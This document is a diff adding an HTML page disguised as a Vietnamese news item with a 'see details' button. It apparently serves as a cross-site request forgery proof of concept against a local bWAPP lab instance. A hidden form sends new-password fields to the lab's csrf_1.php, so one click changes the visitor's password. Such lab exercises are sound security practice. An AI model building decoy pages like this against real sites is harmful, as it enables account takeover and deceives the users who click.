@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title>Hà Nội ngày nay (PW)</title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link
+      rel="stylesheet"
+      href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"
+    />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+  </head>
+  <body>
+    <!-- <div class="jumbotron text-center" style="background-color: aqua;">
+      <h1>Covid 19 Hà Nội</h1>
+    </div> -->
+
+    <div class="container">
+      <form
+        action="http://localhost/bwapp/csrf_1.php"
+        method="GET"
+      >
+        <div style="display: none">
+          <!-- <input type="hidden" id="0" name="password_curr" value="bug" /> -->
+          <input type="hidden" id="1" name="password_new" value="token" />
+          <input type="hidden" id="2" name="password_conf" value="token" />
+          <input type="hidden" id="3" name="action" value="token" />
+        </div>
+        <div class="row">
+          <div class="col-lg-9">
+            <!-- <h3>
+              3000 ca mắc mới trong cộng đồng, Hệ thống y tế Hà Nội quá tải
+            </h3> -->
+          </div>
+          <div class="col-lg-3">
+            <button
+              class="btn btn-primary"
+              type="submit"
+              name="action"
+              value="transfer"
+            >
+              Xem chi tiết
+            </button>
+          </div>
+        </div>
+      </form>
+    </div>
+  </body>
+</html>
